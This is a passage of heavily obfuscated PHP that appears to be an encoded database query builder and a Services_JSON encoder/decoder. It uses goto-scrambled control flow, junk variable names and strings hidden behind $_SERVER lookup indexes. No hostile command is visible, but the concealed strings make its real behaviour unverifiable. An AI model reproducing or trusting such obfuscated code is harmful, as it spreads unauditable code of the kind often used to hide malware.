!1); goto aÈ”è¥§è; aÈ”è¥§è: $DÆÙ«ä­˜õ .= $this->parseComment(!empty($AĞºäßÑ³[$Aè½ğß††Ñ[341]]) ? $AĞºäßÑ³[$Aè½ğß††Ñ[341]] : $Aè½ğß††Ñ[33]); return $this->execute($DÆÙ«ä­˜õ, $this->parseBind(!empty($AĞºäßÑ³[$Aè½ğß††Ñ[273]]) ? $AĞºäßÑ³[$Aè½ğß††Ñ[273]] : array())); goto aÆ«ÊÌ»²ç; AáÄ‘µÌ: $Aè½ğß††Ñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a­¦õÓ˜§ = $dğŠÄ¾™Á— = array(); $this->model = $AĞºäßÑ³[$Aè½ğß††Ñ[269]]; goto dñÔæ›¥•à; aÆ«ÊÌ»²ç: } public function selectInsert($bâŒè¯˜’, $fØÆÎöƒÈ, $f„®•‡æÊ = array()) { goto E½‘ ¯®å; E½‘ ¯®å: $d³ª’‘ºøî =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->model = $f„®•‡æÊ[$d³ª’‘ºøî[269]]; if (is_string($bâŒè¯˜’)) { $bâŒè¯˜’ = explode($d³ª’‘ºøî[47], $bâŒè¯˜’); } goto aÔ‹šÅë›¼; DõÅ¥«ñ…: return $this->execute($d”½°õõÃ, $this->parseBind(!empty($f„®•‡æÊ[$d³ª’‘ºøî[273]]) ? $f„®•‡æÊ[$d³ª’‘ºøî[273]] : array())); goto e±ÏŠë‘µï; aÔ‹šÅë›¼: array_walk($bâŒè¯˜’, array($this, $d³ª’‘ºøî[822])); $d”½°õõÃ = $d³ª’‘ºøî[957] . $this->parseTable($fØÆÎöƒÈ) . $d³ª’‘ºøî[819] . implode($d³ª’‘ºøî[47], $bâŒè¯˜’) . $d³ª’‘ºøî[936]; $d”½°õõÃ .= $this->buildSelectSql($f„®•‡æÊ); goto DõÅ¥«ñ…; e±ÏŠë‘µï: } public function update($BŠƒÆå¹Ç‡, $c£‚ˆ¯¼¶è) { $A¿Î©³ˆã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->model = $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[269]]; $aŒ…Ë ²¸ = $A¿Î©³ˆã[958] . $this->parseTable($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[267]]) . $this->parseSet($BŠƒÆå¹Ç‡) . $this->parseWhere(!empty($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[263]]) ? $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[263]] : $A¿Î©³ˆã[33]) . $this->parseOrder(!empty($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[350]]) ? $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[350]] : $A¿Î©³ˆã[33]) . $this->parseLimit(!empty($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[280]]) ? $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[280]] : $A¿Î©³ˆã[33]) . $this->parseLock(isset($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[775]]) ? $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[775]] : !1) . $this->parseComment(!empty($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[341]]) ? $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[341]] : $A¿Î©³ˆã[33]); return $this->execute($aŒ…Ë ²¸, $this->parseBind(!empty($c£‚ˆ¯¼¶è[$A¿Î©³ˆã[273]]) ? $c£‚ˆ¯¼¶è[$A¿Î©³ˆã[273]] : array())); } public function delete($D‰´™ÍÇËŸ = array()) { $fõÛ÷”ñİù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->model = $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[269]]; $A¥š¸„İ° = $fõÛ÷”ñİù[959] . $this->parseTable($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[267]]) . $this->parseWhere(!empty($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[263]]) ? $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[263]] : $fõÛ÷”ñİù[33]) . $this->parseOrder(!empty($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[350]]) ? $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[350]] : $fõÛ÷”ñİù[33]) . $this->parseLimit(!empty($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[280]]) ? $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[280]] : $fõÛ÷”ñİù[33]) . $this->parseLock(isset($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[775]]) ? $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[775]] : !1) . $this->parseComment(!empty($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[341]]) ? $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[341]] : $fõÛ÷”ñİù[33]); return $this->execute($A¥š¸„İ°, $this->parseBind(!empty($D‰´™ÍÇËŸ[$fõÛ÷”ñİù[273]]) ? $D‰´™ÍÇËŸ[$fõÛ÷”ñİù[273]] : array())); } public function select($b«îÛ÷Ú = array()) { goto C›¶„Ê±£; D²šù›Š±: if ($FŠ¼¢ÓœÉï && !1 !== $bô˜¯ïŒ–¤) { think_cache($eïß©–Âã, $bô˜¯ïŒ–¤, $FŠ¼¢ÓœÉï); } return $bô˜¯ïŒ–¤; goto b—ì°ä¦; DÂÙÀÔİÅæ: $FŠ¼¢ÓœÉï = isset($b«îÛ÷Ú[$aµâàÀŸˆ³[337]]) ? $b«îÛ÷Ú[$aµâàÀŸˆ³[337]] : !1; if ($FŠ¼¢ÓœÉï) { $eïß©–Âã = is_string($FŠ¼¢ÓœÉï[$aµâàÀŸˆ³[89]]) ? $FŠ¼¢ÓœÉï[$aµâàÀŸˆ³[89]] : $aµâàÀŸˆ³[960] . md5($Bª–Š©‚á“); $C§¼»õ‘œœ = think_cache($eïß©–Âã, $aµâàÀŸˆ³[33], $FŠ¼¢ÓœÉï); if (!1 !== $C§¼»õ‘œœ) { return $C§¼»õ‘œœ; } } $bô˜¯ïŒ–¤ = $this->query($Bª–Š©‚á“, $this->parseBind(!empty($b«îÛ÷Ú[$aµâàÀŸˆ³[273]]) ? $b«îÛ÷Ú[$aµâàÀŸˆ³[273]] : array())); goto D²šù›Š±; C›¶„Ê±£: $aµâàÀŸˆ³ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->model = $b«îÛ÷Ú[$aµâàÀŸˆ³[269]]; $Bª–Š©‚á“ = $this->buildSelectSql($b«îÛ÷Ú); goto DÂÙÀÔİÅæ; b—ì°ä¦: } public function buildSelectSql($Bèğå¹Œ¤ë = array()) { goto Eíé§­¶¾; d¹Şƒ´‡“: $B¾ã°æ´ÕÜ = $this->parseSql($this->selectSql, $Bèğå¹Œ¤ë); $B¾ã°æ´ÕÜ .= $this->parseLock(isset($Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[775]]) ? $Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[775]] : !1); if (isset($a¡®ì›ÎÇ¢)) { think_cache($a¡®ì›ÎÇ¢, $B¾ã°æ´ÕÜ); } goto EèÔéÊ³î×; EèÔéÊ³î×: return $B¾ã°æ´ÕÜ; goto AïàÓ“×´ã; Eíé§­¶¾: $BŠí‘ßà¯Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[340]])) { if (strpos($Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[340]], $BŠí‘ßà¯Ÿ[47])) { list($EŸÂÌİåÚÖ, $c‡¦ßæĞÏ) = explode($BŠí‘ßà¯Ÿ[47], $Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[340]]); } else { $EŸÂÌİåÚÖ = $Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[340]]; } $EŸÂÌİåÚÖ = $EŸÂÌİåÚÖ ? $EŸÂÌİåÚÖ : 1; $c‡¦ßæĞÏ = isset($c‡¦ßæĞÏ) ? $c‡¦ßæĞÏ : (is_numeric($Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[280]]) ? $Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[280]] : 20); $C¯èø’Õ‚Ÿ = $c‡¦ßæĞÏ * ((int) $EŸÂÌİåÚÖ - 1); $Bèğå¹Œ¤ë[$BŠí‘ßà¯Ÿ[280]] = $C¯èø’Õ‚Ÿ . $BŠí‘ßà¯Ÿ[47] . $c‡¦ßæĞÏ; } if (think_config($BŠí‘ßà¯Ÿ[961])) { $a¡®ì›ÎÇ¢ = $BŠí‘ßà¯Ÿ[962] . md5(serialize($Bèğå¹Œ¤ë)); $dÒŒØ‘ŠÀÆ = think_cache($a¡®ì›ÎÇ¢); if ($dÒŒØ‘ŠÀÆ) { return $dÒŒØ‘ŠÀÆ; } } goto d¹Şƒ´‡“; AïàÓ“×´ã: } public function parseSql($CÈˆç³³ÏÒ, $AÁšêí„ÃĞ = array()) { $a¬îĞ¼¿»“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $CÈˆç³³ÏÒ = str_replace(array($a¬îĞ¼¿»“[963], $a¬îĞ¼¿»“[964], $a¬îĞ¼¿»“[965], $a¬îĞ¼¿»“[966], $a¬îĞ¼¿»“[967], $a¬îĞ¼¿»“[968], $a¬îĞ¼¿»“[969], $a¬îĞ¼¿»“[970], $a¬îĞ¼¿»“[971], $a¬îĞ¼¿»“[972], $a¬îĞ¼¿»“[973]), array($this->parseTable("{$AÁšêí„ÃĞ[$a¬îĞ¼¿»“[267]]}"), $this->parseDistinct(isset($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[974]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[974]] : !1), $this->parseField(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[261]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[261]] : $a¬îĞ¼¿»“[176]), $this->parseJoin(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[270]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[270]] : $a¬îĞ¼¿»“[33]), $this->parseWhere(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[263]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[263]] : $a¬îĞ¼¿»“[33]), $this->parseGroup(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[975]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[975]] : $a¬îĞ¼¿»“[33]), $this->parseHaving(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[976]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[976]] : $a¬îĞ¼¿»“[33]), $this->parseOrder(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[350]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[350]] : $a¬îĞ¼¿»“[33]), $this->parseLimit(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[280]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[280]] : $a¬îĞ¼¿»“[33]), $this->parseUnion(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[335]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[335]] : $a¬îĞ¼¿»“[33]), $this->parseComment(!empty($AÁšêí„ÃĞ[$a¬îĞ¼¿»“[341]]) ? $AÁšêí„ÃĞ[$a¬îĞ¼¿»“[341]] : $a¬îĞ¼¿»“[33])), $CÈˆç³³ÏÒ); return $CÈˆç³³ÏÒ; } public function getLastSql($fŠŸïÈ¹á = '') { return $fŠŸïÈ¹á ? $this->modelSql[$fŠŸïÈ¹á] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($FÆêêÅ‡Ç) { return addslashes($FÆêêÅ‡Ç); } public function setModel($CÒ«²Æ¾ì) { $this->model = $CÒ«²Æ¾ì; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto DÈÁÓŒ÷½ù; A‰ˆ¼¯é…¡: class Services_JSON { function __construct($f‹Û²™¹† = 0) { $this->use = $f‹Û²™¹†; } function utf162utf8($BÕ¹‚Ã©˜) { $cŒƒˆà¢ÕÔ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (function_exists($cŒƒˆà¢ÕÔ[68])) { return mb_convert_encoding($BÕ¹‚Ã©˜, $cŒƒˆà¢ÕÔ[1598], $cŒƒˆà¢ÕÔ[1947]); } $A‡¿³áµ™ = ord($BÕ¹‚Ã©˜[0]) << 8 | ord($BÕ¹‚Ã©˜[1]); switch (!0) { case (127 & $A‡¿³áµ™) == $A‡¿³áµ™: return chr(127 & $A‡¿³áµ™); case (2047 & $A‡¿³áµ™) == $A‡¿³áµ™: return chr(192 | $A‡¿³áµ™ >> 6 & 31) . chr(128 | $A‡¿³áµ™ & 63); case (65535 & $A‡¿³áµ™) == $A‡¿³áµ™: return chr(224 | $A‡¿³áµ™ >> 12 & 15) . chr(128 | $A‡¿³áµ™ >> 6 & 63) . chr(128 | $A‡¿³áµ™ & 63); } return $cŒƒˆà¢ÕÔ[33]; } function utf82utf16($fµŠ¤æƒ·È) { $D«Ì¢ôğ‚‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (function_exists($D«Ì¢ôğ‚‡[68])) { return mb_convert_encoding($fµŠ¤æƒ·È, $D«Ì¢ôğ‚‡[1947], $D«Ì¢ôğ‚‡[1598]); } switch (strlen($fµŠ¤æƒ·È)) { case 1: return $fµŠ¤æƒ·È; case 2: return chr(7 & ord($fµŠ¤æƒ·È[0]) >> 2) . chr(192 & ord($fµŠ¤æƒ·È[0]) << 6 | 63 & ord($fµŠ¤æƒ·È[1])); case 3: return chr(240 & ord($fµŠ¤æƒ·È[0]) << 4 | 15 & ord($fµŠ¤æƒ·È[1]) >> 2) . chr(192 & ord($fµŠ¤æƒ·È[1]) << 6 | 127 & ord($fµŠ¤æƒ·È[2])); } return $D«Ì¢ôğ‚‡[33]; } function encode($eƒ‘â¿‰¡¾) { $dˆ¥Ò¸§‰´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; switch (gettype($eƒ‘â¿‰¡¾)) { case $dˆ¥Ò¸§‰´[1609]: return $eƒ‘â¿‰¡¾ ? $dˆ¥Ò¸§‰´[1608] : $dˆ¥Ò¸§‰´[1610]; case $dˆ¥Ò¸§‰´[1948]: return $dˆ¥Ò¸§‰´[99]; case $dˆ¥Ò¸§‰´[303]: return (int) $eƒ‘â¿‰¡¾; case $dˆ¥Ò¸§‰´[278]: case $dˆ¥Ò¸§‰´[277]: return (double) $eƒ‘â¿‰¡¾; case $dˆ¥Ò¸§‰´[312]: $E °äˆ½ = $dˆ¥Ò¸§‰´[33]; $aßí³ÆãÕ« = strlen($eƒ‘â¿‰¡¾); for ($B¸»¢Ù†Ş = 0; $B¸»¢Ù†Ş < $aßí³ÆãÕ«; ++$B¸»¢Ù†Ş) { $aÆèœ’ºÄ = ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş]); switch (!0) { case $aÆèœ’ºÄ == 8: $E °äˆ½ .= $dˆ¥Ò¸§‰´[1949]; break; case $aÆèœ’ºÄ == 9: $E °äˆ½ .= $dˆ¥Ò¸§‰´[1585]; break; case $aÆèœ’ºÄ == 10: $E °äˆ½ .= $dˆ¥Ò¸§‰´[1583]; break; case $aÆèœ’ºÄ == 12: $E °äˆ½ .= $dˆ¥Ò¸§‰´[1950]; break; case $aÆèœ’ºÄ == 13: $E °äˆ½ .= $dˆ¥Ò¸§‰´[1584]; break; case $aÆèœ’ºÄ == 34: case $aÆèœ’ºÄ == 47: case $aÆèœ’ºÄ == 92: $E °äˆ½ .= $dˆ¥Ò¸§‰´[93] . $eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş]; break; case $aÆèœ’ºÄ >= 32 && $aÆèœ’ºÄ <= 127: $E °äˆ½ .= $eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş]; break; case ($aÆèœ’ºÄ & 224) == 192: $F¯ËÜ„¾¢± = pack($dˆ¥Ò¸§‰´[1951], $aÆèœ’ºÄ, ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 1])); $B¸»¢Ù†Ş += 1; $A«Ï²¹¬öÙ = $this->utf82utf16($F¯ËÜ„¾¢±); $E °äˆ½ .= sprintf($dˆ¥Ò¸§‰´[1952], bin2hex($A«Ï²¹¬öÙ)); break; case ($aÆèœ’ºÄ & 240) == 224: $F¯ËÜ„¾¢± = pack($dˆ¥Ò¸§‰´[1951], $aÆèœ’ºÄ, ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 1]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 2])); $B¸»¢Ù†Ş += 2; $A«Ï²¹¬öÙ = $this->utf82utf16($F¯ËÜ„¾¢±); $E °äˆ½ .= sprintf($dˆ¥Ò¸§‰´[1952], bin2hex($A«Ï²¹¬öÙ)); break; case ($aÆèœ’ºÄ & 248) == 240: $F¯ËÜ„¾¢± = pack($dˆ¥Ò¸§‰´[1951], $aÆèœ’ºÄ, ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 1]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 2]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 3])); $B¸»¢Ù†Ş += 3; $A«Ï²¹¬öÙ = $this->utf82utf16($F¯ËÜ„¾¢±); $E °äˆ½ .= sprintf($dˆ¥Ò¸§‰´[1952], bin2hex($A«Ï²¹¬öÙ)); break; case ($aÆèœ’ºÄ & 252) == 248: $F¯ËÜ„¾¢± = pack($dˆ¥Ò¸§‰´[1951], $aÆèœ’ºÄ, ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 1]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 2]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 3]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 4])); $B¸»¢Ù†Ş += 4; $A«Ï²¹¬öÙ = $this->utf82utf16($F¯ËÜ„¾¢±); $E °äˆ½ .= sprintf($dˆ¥Ò¸§‰´[1952], bin2hex($A«Ï²¹¬öÙ)); break; case ($aÆèœ’ºÄ & 254) == 252: $F¯ËÜ„¾¢± = pack($dˆ¥Ò¸§‰´[1951], $aÆèœ’ºÄ, ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 1]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 2]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 3]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 4]), ord($eƒ‘â¿‰¡¾[$B¸»¢Ù†Ş + 5])); $B¸»¢Ù†Ş += 5; $A«Ï²¹¬öÙ = $this->utf82utf16($F¯ËÜ„¾¢±); $E °äˆ½ .= sprintf($dˆ¥Ò¸§‰´[1952], bin2hex($A«Ï²¹¬öÙ)); break; } } return $dˆ¥Ò¸§‰´[113] . $E °äˆ½ . $dˆ¥Ò¸§‰´[113]; case $dˆ¥Ò¸§‰´[1953]: if (is_array($eƒ‘â¿‰¡¾) && count($eƒ‘â¿‰¡¾) && array_keys($eƒ‘â¿‰¡¾) !== range(0, sizeof($eƒ‘â¿‰¡¾) - 1)) { $BÓôÃ‰åŞÆ = array_map(array($this, $dˆ¥Ò¸§‰´[1954]), array_keys($eƒ‘â¿‰¡¾), array_values($eƒ‘â¿‰¡¾)); foreach ($BÓôÃ‰åŞÆ as $EğŸŸ‰›†ê) { if (Services_JSON::isError($EğŸŸ‰›†ê)) { return $EğŸŸ‰›†ê; } } return $dˆ¥Ò¸§‰´[1072] . join($dˆ¥Ò¸§‰´[47], $BÓôÃ‰åŞÆ) . $dˆ¥Ò¸§‰´[315]; } $fÀšéÉÏã› = array_map(array($this, $dˆ¥Ò¸§‰´[1955]), $eƒ‘â¿‰¡¾); foreach ($fÀšéÉÏã› as $d™òÜ­ö¶) { if (Services_JSON::isError($d™òÜ­ö¶)) { return $d™òÜ­ö¶; } } return $dˆ¥Ò¸§‰´[157] . join($dˆ¥Ò¸§‰´[47], $fÀšéÉÏã›) . $dˆ¥Ò¸§‰´[476]; case $dˆ¥Ò¸§‰´[1956]: $D¥ÛÊ›¿…÷ = get_object_vars($eƒ‘â¿‰¡¾); $BÓôÃ‰åŞÆ = array_map(array($this, $dˆ¥Ò¸§‰´[1954]), array_keys($D¥ÛÊ›¿…÷), array_values($D¥ÛÊ›¿…÷)); foreach ($BÓôÃ‰åŞÆ as $EğŸŸ‰›†ê) { if (Services_JSON::isError($EğŸŸ‰›†ê)) { return $EğŸŸ‰›†ê; } } return $dˆ¥Ò¸§‰´[1072] . join($dˆ¥Ò¸§‰´[47], $BÓôÃ‰åŞÆ) . $dˆ¥Ò¸§‰´[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $dˆ¥Ò¸§‰´[99] : new Services_JSON_Error(gettype($eƒ‘â¿‰¡¾) . $dˆ¥Ò¸§‰´[1957]); } } function name_value($e›­‘¼¸ƒ, $CÂÌù®ßÔİ) { $f¿ïãÄÍ = $this->encode($CÂÌù®ßÔİ); if (Services_JSON::isError($f¿ïãÄÍ)) { return $f¿ïãÄÍ; } return $this->encode(strval($e›­‘¼¸ƒ)) . $_SERVER[³‘’¼äÑ™ÔÍ][4] . $f¿ïãÄÍ; } function reduce_string($C„ß¾Ë³…) { $CâšÁ‡Ñ½Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C„ß¾Ë³… = preg_replace(array($CâšÁ‡Ñ½Î[1958], $CâšÁ‡Ñ½Î[1959], $CâšÁ‡Ñ½Î[1960]), $CâšÁ‡Ñ½Î[33], $C„ß¾Ë³…); return trim($C„ß¾Ë³…); } function decode($f†Çâíäİ) { $e½ãõŠ§¬’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f†Çâíäİ = $this->reduce_string($f†Çâíäİ); switch (strtolower($f†Çâíäİ)) { case $e½ãõŠ§¬’[1608]: return !0; case $e½ãõŠ§¬’[1610]: return !1; case $e½ãõŠ§¬’[99]: return null; default: $d‰¡ŞìÇéÔ = array(); if (is_numeric($f†Çâíäİ)) { return (double) $f†Çâíäİ == (int) $f†Çâíäİ ? (int) $f†Çâíäİ : (double) $f†Çâíäİ; } elseif (preg_match($e½ãõŠ§¬’[1961], $f†Çâíäİ, $d‰¡ŞìÇéÔ) && $d‰¡ŞìÇéÔ[1] == $d‰¡ŞìÇéÔ[2]) { $eÚº­‘¤Í’ = substr($f†Çâíäİ, 0, 1); $c²Œ…½¤®ñ = substr($f†Çâíäİ, 1, -1); $d¿½¢‡ÊğÎ = $e½ãõŠ§¬’[33]; $Bò­Òšì†¯ = strlen($c²Œ…½¤®ñ); for ($d›‘’Ìˆ§ = 0; $d›‘’Ìˆ§ < $Bò­Òšì†¯; ++$d›‘’Ìˆ§) { $CÙùêÇ÷– = substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 2); $A‚ôªä®¸ = ord($c²Œ…½¤®ñ[$d›‘’Ìˆ§]); switch (!0) { case $CÙùêÇ÷– == $e½ãõŠ§¬’[1949]: $d¿½¢‡ÊğÎ .= chr(8); ++$d›‘’Ìˆ§; break; case $CÙùêÇ÷– == $e½ãõŠ§¬’[1585]: $d¿½¢‡ÊğÎ .= chr(9); ++$d›‘’Ìˆ§; break; case $CÙùêÇ÷– == $e½ãõŠ§¬’[1583]: $d¿½¢‡ÊğÎ .= chr(10); ++$d›‘’Ìˆ§; break; case $CÙùêÇ÷– == $e½ãõŠ§¬’[1950]: $d¿½¢‡ÊğÎ .= chr(12); ++$d›‘’Ìˆ§; break; case $CÙùêÇ÷– == $e½ãõŠ§¬’[1584]: $d¿½¢‡ÊğÎ .= chr(13); ++$d›‘’Ìˆ§; break; case $CÙùêÇ÷– == $e½ãõŠ§¬’[1365]: case $CÙùêÇ÷– == $e½ãõŠ§¬’[1962]: case $CÙùêÇ÷– == $e½ãõŠ§¬’[1578]: case $CÙùêÇ÷– == $e½ãõŠ§¬’[1580]: if ($eÚº­‘¤Í’ == $e½ãõŠ§¬’[113] && $CÙùêÇ÷– != $e½ãõŠ§¬’[1962] || $eÚº­‘¤Í’ == $e½ãõŠ§¬’[55] && $CÙùêÇ÷– != $e½ãõŠ§¬’[1365]) { $d¿½¢‡ÊğÎ .= $c²Œ…½¤®ñ[++$d›‘’Ìˆ§]; } break; case preg_match($e½ãõŠ§¬’[1963], substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 6)): $f­ĞÔ…¦¿˜ = chr(hexdec(substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§ + 2, 2))) . chr(hexdec(substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§ + 4, 2))); $d¿½¢‡ÊğÎ .= $this->utf162utf8($f­ĞÔ…¦¿˜); $d›‘’Ìˆ§ += 5; break; case $A‚ôªä®¸ >= 32 && $A‚ôªä®¸ <= 127: $d¿½¢‡ÊğÎ .= $c²Œ…½¤®ñ[$d›‘’Ìˆ§]; break; case ($A‚ôªä®¸ & 224) == 192: $d¿½¢‡ÊğÎ .= substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 2); ++$d›‘’Ìˆ§; break; case ($A‚ôªä®¸ & 240) == 224: $d¿½¢‡ÊğÎ .= substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 3); $d›‘’Ìˆ§ += 2; break; case ($A‚ôªä®¸ & 248) == 240: $d¿½¢‡ÊğÎ .= substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 4); $d›‘’Ìˆ§ += 3; break; case ($A‚ôªä®¸ & 252) == 248: $d¿½¢‡ÊğÎ .= substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 5); $d›‘’Ìˆ§ += 4; break; case ($A‚ôªä®¸ & 254) == 252: $d¿½¢‡ÊğÎ .= substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 6); $d›‘’Ìˆ§ += 5; break; } } return $d¿½¢‡ÊğÎ; } elseif (preg_match($e½ãõŠ§¬’[1964], $f†Çâíäİ) || preg_match($e½ãõŠ§¬’[1965], $f†Çâíäİ)) { goto b«½£ïŸ; b«½£ïŸ: if ($f†Çâíäİ[0] == $e½ãõŠ§¬’[157]) { $f­†”š«ª™ = array(SERVICES_JSON_IN_ARR); $C•ãé–‚ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f­†”š«ª™ = array(SERVICES_JSON_IN_OBJ); $eá†ïµõ©à = array(); } else { $f­†”š«ª™ = array(SERVICES_JSON_IN_OBJ); $eá†ïµõ©à = new stdClass(); } } array_push($f­†”š«ª™, array($e½ãõŠ§¬’[1966] => SERVICES_JSON_SLICE, $e½ãõŠ§¬’[263] => 0, $e½ãõŠ§¬’[1967] => !1)); $c²Œ…½¤®ñ = substr($f†Çâíäİ, 1, -1); goto dˆ»Ñ¤ØÚ; dˆ»Ñ¤ØÚ: $c²Œ…½¤®ñ = $this->reduce_string($c²Œ…½¤®ñ); if ($c²Œ…½¤®ñ == $e½ãõŠ§¬’[33]) { if (reset($f­†”š«ª™) == SERVICES_JSON_IN_ARR) { return $C•ãé–‚; } else { return $eá†ïµõ©à; } } $Bò­Òšì†¯ = strlen($c²Œ…½¤®ñ); goto e ‰­¢Ú§Ò; e ‰­¢Ú§Ò: for ($d›‘’Ìˆ§ = 0; $d›‘’Ìˆ§ <= $Bò­Òšì†¯; ++$d›‘’Ìˆ§) { $Dº¦£Ò¼ó = end($f­†”š«ª™); $CÙùêÇ÷– = substr($c²Œ…½¤®ñ, $d›‘’Ìˆ§, 2); if ($d›‘’Ìˆ§ == $Bò­Òšì†¯ || $c²Œ…½¤®ñ[$d›‘’Ìˆ§] == $e½ãõŠ§¬’[47] && $Dº¦£Ò¼ó[$e½ãõŠ§¬’[1966]] == SERVICES_JSON_SLICE) { $f¯İ‡–·Á = substr($c²Œ…½¤®ñ, $Dº¦£Ò¼ó[$e½ãõŠ§¬’[263]], $d›‘’Ìˆ§ - $Dº¦£Ò¼ó[$e½ãõŠ§¬’[263]]); array_push($f­†”š«ª™, array($e½ãõŠ§¬’[1966] => SERVICES_JSON_SLICE, $e½ãõŠ§¬’[263] => $d›‘’Ìˆ§ + 1, $e½ãõŠ§¬’[1967] => !1)); if (reset($f­†”š«ª™) == SERVICES_JSON_IN_ARR) { array_push($C•ãé–‚, $this->decode($f¯İ‡–·Á)); } elseif (reset($f­†”š«ª™) == SERVICES_JSON_IN_OBJ) { $fŠÂßÊœÓ = array(); if (preg_match($e½ãõŠ§¬’[1968], $f¯İ‡–·Á, $fŠÂßÊœÓ)) { $DÏ•¾–½ª› = $this->decode($fŠÂßÊœÓ[1]); $d«³‹ÓŠ = $this->decode($fŠÂßÊœÓ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eá†ïµõ©à[$DÏ•¾–½ª›] = $d«³‹ÓŠ; } else { $eá†ïµõ©à->{$DÏ•¾–½ª›} = $d«³‹ÓŠ; } } elseif (preg_match($e½ãõŠ§¬’[1969], $f¯İ‡–·Á, $fŠÂßÊœÓ)) { $DÏ•¾–½ª› = $fŠÂßÊœÓ[1]; $d«³‹ÓŠ = $this->decode($fŠÂßÊœÓ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $eá†ïµõ©à[$DÏ•¾–½ª›] = $d«³‹ÓŠ; } else { $eá†ïµõ©à->{$DÏ•¾–½ª›} = $d«³‹ÓŠ; } } } } elseif (($c²Œ…½¤®ñ[$d›‘’Ìˆ§] == 